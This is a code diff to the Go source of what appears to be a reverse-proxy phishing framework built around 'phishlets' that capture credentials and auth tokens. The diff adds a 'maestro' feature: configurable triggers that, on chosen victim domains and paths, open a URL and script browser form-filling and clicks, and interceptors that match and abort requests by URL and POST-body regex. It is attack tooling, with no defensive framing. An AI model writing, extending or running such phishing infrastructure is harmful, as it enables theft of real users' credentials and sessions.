@@ -106,6 +106,33 @@ type Intercept struct {
 	headers     map[string]string
 }
 
+type maestroAction struct {
+	selector  string `mapstructure:"selector"`
+	value     string `mapstructure:"value"`
+	click     bool   `mapstructure:"click"`
+	post_wait int    `mapstructure:"post_wait"`
+}
+
+type maestroTrigger struct {
+	domains  []string        `mapstructure:"domains"`
+	paths    []string        `mapstructure:"paths"`
+	token    string          `mapstructure:"token"`
+	open_url string          `mapstructure:"open_url"`
+	actions  []maestroAction `mapstructure:"actions"`
+}
+
+type maestroInterceptor struct {
+	token   string         `mapstructure:"token"`
+	url_re  *regexp.Regexp `mapstructure:"url_re"`
+	post_re *regexp.Regexp `mapstructure:"post_re"`
+	abort   bool           `mapstructure:"abort"`
+}
+
+type maestroConfig struct {
+	triggers     []maestroTrigger
+	interceptors []maestroInterceptor
+}
+
 type Phishlet struct {
 	Name             string
 	ParentName       string
@@ -133,6 +160,7 @@ type Phishlet struct {
 	customParams     map[string]string
 	isTemplate       bool
 	Crawlfence       *CrawlfenceConfig
+	maestro          *maestroConfig
 }
 
 type ConfigParam struct {
@@ -221,6 +249,33 @@ type ConfigIntercept struct {
 	Headers    *map[string]string `mapstructure:"headers"`
 }
 
+type ConfigMaestroAction struct {
+	Selector *string `mapstructure:"selector"`
+	Value    *string `mapstructure:"value"`
+	Click    *bool   `mapstructure:"click"`
+	PostWait *int    `mapstructure:"post_wait"`
+}
+
+type ConfigMaestroTrigger struct {
+	Domains *[]string               `mapstructure:"domains"`
+	Paths   *[]string               `mapstructure:"paths"`
+	Token   *string                 `mapstructure:"token"`
+	OpenUrl *string                 `mapstructure:"open_url"`
+	Actions *[]ConfigMaestroAction `mapstructure:"actions"`
+}
+
+type ConfigMaestroInterceptor struct {
+	Token  *string `mapstructure:"token"`
+	UrlRe  *string `mapstructure:"url_re"`
+	PostRe *string `mapstructure:"post_re"`
+	Abort  *bool   `mapstructure:"abort"`
+}
+
+type ConfigMaestro struct {
+	Triggers     *[]ConfigMaestroTrigger     `mapstructure:"triggers"`
+	Interceptors *[]ConfigMaestroInterceptor `mapstructure:"interceptors"`
+}
+
 type ConfigCrawlfenceJA4 struct {
 	Mode      string   `mapstructure:"mode"`
 	Whitelist []string `mapstructure:"whitelist"`
@@ -239,20 +294,21 @@ type ConfigCrawlfence struct {
 }
 
 type ConfigPhishlet struct {
-	Name        string             `mapstructure:"name"`
-	RedirectUrl string             `mapstructure:"redirect_url"`
-	Params      *[]ConfigParam     `mapstructure:"params"`
-	ProxyHosts  *[]ConfigProxyHost `mapstructure:"proxy_hosts"`
-	SubFilters  *[]ConfigSubFilter `mapstructure:"sub_filters"`
-	AuthTokens  *[]ConfigAuthToken `mapstructure:"auth_tokens"`
-	AuthUrls    []string           `mapstructure:"auth_urls"`
-	Credentials *ConfigCredentials `mapstructure:"credentials"`
-	ForcePosts  *[]ConfigForcePost `mapstructure:"force_post"`
-	LandingPath *[]string          `mapstructure:"landing_path"`
-	LoginItem   *ConfigLogin       `mapstructure:"login"`
-	JsInject    *[]ConfigJsInject  `mapstructure:"js_inject"`
-	Intercept   *[]ConfigIntercept `mapstructure:"intercept"`
-	Crawlfence  *ConfigCrawlfence  `mapstructure:"crawlfence"`
+	Name        string               `mapstructure:"name"`
+	RedirectUrl string               `mapstructure:"redirect_url"`
+	Params      *[]ConfigParam       `mapstructure:"params"`
+	ProxyHosts  *[]ConfigProxyHost   `mapstructure:"proxy_hosts"`
+	SubFilters  *[]ConfigSubFilter   `mapstructure:"sub_filters"`
+	AuthTokens  *[]ConfigAuthToken   `mapstructure:"auth_tokens"`
+	AuthUrls    []string             `mapstructure:"auth_urls"`
+	Credentials *ConfigCredentials   `mapstructure:"credentials"`
+	ForcePosts  *[]ConfigForcePost   `mapstructure:"force_post"`
+	LandingPath *[]string            `mapstructure:"landing_path"`
+	LoginItem   *ConfigLogin         `mapstructure:"login"`
+	JsInject    *[]ConfigJsInject    `mapstructure:"js_inject"`
+	Intercept   *[]ConfigIntercept   `mapstructure:"intercept"`
+	Crawlfence  *ConfigCrawlfence    `mapstructure:"crawlfence"`
+	Maestro     *ConfigMaestro       `mapstructure:"maestro"`
 }
 
 func NewPhishlet(site string, path string, customParams *map[string]string, cfg *Config) (*Phishlet, error) {
@@ -815,6 +871,105 @@ func (p *Phishlet) LoadFromFile(site string, path string, customParams *map[stri
 		}
 	}
 
+	// Parse maestro configuration
+	if fp.Maestro != nil {
+		p.maestro = &maestroConfig{
+			triggers:     []maestroTrigger{},
+			interceptors: []maestroInterceptor{},
+		}
+
+		// Parse triggers
+		if fp.Maestro.Triggers != nil {
+			for _, tr := range *fp.Maestro.Triggers {
+				if tr.Domains == nil {
+					return fmt.Errorf("maestro: missing `domains` field in trigger")
+				}
+				if tr.Paths == nil {
+					return fmt.Errorf("maestro: missing `paths` field in trigger")
+				}
+				if tr.Token == nil {
+					return fmt.Errorf("maestro: missing `token` field in trigger")
+				}
+				if tr.OpenUrl == nil {
+					return fmt.Errorf("maestro: missing `open_url` field in trigger")
+				}
+				if tr.Actions == nil {
+					return fmt.Errorf("maestro: missing `actions` field in trigger")
+				}
+
+				trigger := maestroTrigger{
+					domains:  *tr.Domains,
+					paths:    *tr.Paths,
+					token:    *tr.Token,
+					open_url: *tr.OpenUrl,
+					actions:  []maestroAction{},
+				}
+
+				// Parse actions
+				for _, ac := range *tr.Actions {
+					if ac.Selector == nil {
+						return fmt.Errorf("maestro: missing `selector` field in action")
+					}
+
+					action := maestroAction{
+						selector: *ac.Selector,
+					}
+
+					if ac.Value != nil {
+						action.value = *ac.Value
+					}
+					if ac.Click != nil {
+						action.click = *ac.Click
+					}
+					if ac.PostWait != nil {
+						action.post_wait = *ac.PostWait
+					}
+
+					trigger.actions = append(trigger.actions, action)
+				}
+
+				p.maestro.triggers = append(p.maestro.triggers, trigger)
+			}
+		}
+
+		// Parse interceptors
+		if fp.Maestro.Interceptors != nil {
+			for _, ic := range *fp.Maestro.Interceptors {
+				if ic.Token == nil {
+					return fmt.Errorf("maestro: missing `token` field in interceptor")
+				}
+				if ic.UrlRe == nil {
+					return fmt.Errorf("maestro: missing `url_re` field in interceptor")
+				}
+				if ic.PostRe == nil {
+					return fmt.Errorf("maestro: missing `post_re` field in interceptor")
+				}
+
+				url_re, err := regexp.Compile(*ic.UrlRe)
+				if err != nil {
+					return fmt.Errorf("maestro: invalid `url_re` regex: %v", err)
+				}
+
+				post_re, err := regexp.Compile(*ic.PostRe)
+				if err != nil {
+					return fmt.Errorf("maestro: invalid `post_re` regex: %v", err)
+				}
+
+				interceptor := maestroInterceptor{
+					token:   *ic.Token,
+					url_re:  url_re,
+					post_re: post_re,
+				}
+
+				if ic.Abort != nil {
+					interceptor.abort = *ic.Abort
+				}
+
+				p.maestro.interceptors = append(p.maestro.interceptors, interceptor)
+			}
+		}
+	}
+
 	return nil
 }
 
@@ -1163,4 +1318,54 @@ func (p *Phishlet) paramVal(s string) string {
 		}
 	}
 	return ret
+}
+
+// Maestro helper methods
+
+func (p *Phishlet) HasMaestro() bool {
+	return p.maestro != nil
+}
+
+func (p *Phishlet) GetMaestroTrigger(domain string, path string) *maestroTrigger {
+	if p.maestro == nil {
+		return nil
+	}
+
+	for _, trigger := range p.maestro.triggers {
+		// Check if domain matches
+		domain_matched := false
+		for _, d := range trigger.domains {
+			if strings.ToLower(d) == strings.ToLower(domain) {
+				domain_matched = true
+				break
+			}
+		}
+
+		if !domain_matched {
+			continue
+		}
+
+		// Check if path matches
+		for _, p_str := range trigger.paths {
+			if strings.HasPrefix(path, p_str) {
+				return &trigger
+			}
+		}
+	}
+
+	return nil
+}
+
+func (p *Phishlet) GetMaestroInterceptor(token string) *maestroInterceptor {
+	if p.maestro == nil {
+		return nil
+	}
+
+	for _, interceptor := range p.maestro.interceptors {
+		if interceptor.token == token {
+			return &interceptor
+		}
+	}
+
+	return nil
 }
